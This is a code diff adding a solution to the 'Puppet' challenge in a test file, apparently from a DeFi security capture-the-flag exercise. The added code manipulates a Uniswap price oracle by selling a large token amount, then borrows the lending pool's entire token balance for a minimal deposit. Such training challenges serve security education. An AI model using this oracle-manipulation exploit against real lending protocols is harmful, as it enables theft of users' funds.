@@ -103,6 +103,34 @@ describe('[Challenge] Puppet', function () {
 
     it('Exploit', async function () {
         /** CODE YOUR EXPLOIT HERE */
+
+        //just sell a lot of tokens to manipulate the price and take the borrow 
+        const parseEther = ethers.utils.parseEther;
+
+        const token = await this.token.connect(attacker);
+    
+
+        const uniswap = await this.uniswapExchange.connect(attacker);
+
+        const deadline = (await ethers.provider.getBlock('latest')).timestamp * 3;
+
+        let tx = await token.approve(uniswap.address,parseEther("1000"));
+
+        await tx.wait();
+        
+        tx = await uniswap.tokenToEthTransferInput(parseEther("999"),parseEther("4"),deadline,attacker.address,{ gasLimit: 1e6 });
+
+        await tx.wait();
+
+        const pool = await this.lendingPool.connect(attacker);
+
+        const deposit = await pool.calculateDepositRequired(POOL_INITIAL_TOKEN_BALANCE);
+
+        console.log(deposit.div(parseEther("0.01")).toString())
+        
+        tx = await pool.borrow(POOL_INITIAL_TOKEN_BALANCE,{value:deposit});
+
+        await tx.wait();
     });
 
     after(async function () {
